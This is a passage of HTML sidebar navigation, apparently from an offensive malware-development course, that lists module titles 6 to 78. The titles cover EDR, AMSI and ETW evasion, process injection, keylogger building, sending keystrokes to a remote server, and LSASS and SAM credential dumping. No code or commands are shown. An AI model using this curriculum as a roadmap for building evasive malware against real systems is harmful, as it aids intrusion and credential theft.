                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
